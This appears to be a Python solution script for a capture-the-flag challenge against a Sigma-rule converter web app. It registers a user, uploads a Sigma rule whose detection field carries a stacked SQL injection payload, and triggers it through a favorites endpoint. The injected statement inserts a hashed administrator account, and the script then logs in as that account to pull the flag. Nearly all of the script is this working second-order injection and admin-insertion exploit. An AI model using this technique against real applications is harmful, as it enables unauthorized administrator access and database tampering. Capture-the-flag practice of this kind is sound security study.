import requests
import re
import bcrypt
import secrets

BASE = "https://ikutoppene-ce17ceea-sigmaconverter.ept.gg"
PORTAL = f"{BASE}/portal"
ADMIN = f"{BASE}/admin"

# Generate unique portal user
portal_username = f"user{secrets.token_hex(4)}@example.com"
portal_password = "A" * 20 + secrets.token_hex(4)

# Generate admin user to insert
admin_username = f"admin{secrets.token_hex(3)}"
admin_password = "SuperSecurePassword123!"  # >=20 with combination
if len(admin_password) < 20:
    admin_password = admin_password + "!" * (20 - len(admin_password))
admin_hash = bcrypt.hashpw(f"{admin_username}{admin_password}".encode(), bcrypt.gensalt()).hex()

sigma_rule = f"""
title: Auto Exploit
id: 123e4567-e89b-12d3-a456-426614174099
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|contains: "'); COMMIT; INSERT INTO users VALUES (DEFAULT,'{admin_username}',DECODE('{admin_hash}','hex'),true) RETURNING 1; COMMIT; SELECT 1; -- "
  condition: selection
"""

sess = requests.Session()
sess.headers.update({"User-Agent": "Mozilla/5.0"})

# Step 1: Register
register_resp = sess.post(f"{PORTAL}/register", data={"username": portal_username, "password": portal_password}, timeout=15)
if register_resp.status_code not in (200, 302):
    raise SystemExit(f"Registration failed: {register_resp.status_code}")

# Step 2: Login
login_resp = sess.post(f"{PORTAL}/login", data={"username": portal_username, "password": portal_password}, timeout=15, allow_redirects=False)
if login_resp.status_code not in (302, 200):
    raise SystemExit(f"Login failed: {login_resp.status_code}")

# Step 3: Convert malicious Sigma rule
convert_resp = sess.post(f"{PORTAL}/convert_yaml", json={"text": sigma_rule}, timeout=15)
if convert_resp.status_code != 200:
    raise SystemExit(f"Conversion failed: {convert_resp.status_code}")

# Step 4: Grab newest rule id
rules_resp = sess.get(f"{PORTAL}/my-rules", timeout=15)
rule_ids = [int(x) for x in re.findall(r"data-rule-id=\"(\d+)\"", rules_resp.text)]
if not rule_ids:
    raise SystemExit("No rule IDs found")
rule_id = str(max(rule_ids))

# Step 5: Mark as favorite
fav_resp = sess.post(f"{PORTAL}/toggle-favorite/{rule_id}", timeout=15)
if fav_resp.status_code != 200:
    raise SystemExit(f"Toggle favorite failed: {fav_resp.status_code}")

# Step 6: Trigger SQL injection
trigger_resp = sess.get(f"{PORTAL}/api/combined-rules/favorites-status", timeout=15)
if trigger_resp.status_code != 200:
    raise SystemExit(f"Injection trigger failed: {trigger_resp.status_code}")

# Step 7: Login to admin with inserted user
admin_sess = requests.Session()
admin_sess.headers.update({"User-Agent": "Mozilla/5.0"})
admin_login = admin_sess.post(f"{ADMIN}/", data={"username": admin_username, "password": admin_password}, timeout=15, allow_redirects=True)
if "/welcome" not in admin_login.url:
    raise SystemExit("Admin login failed")

match = re.search(r"EPT\{[^}]+\}", admin_login.text)
if not match:
    raise SystemExit("Flag not found")

print(match.group(0))
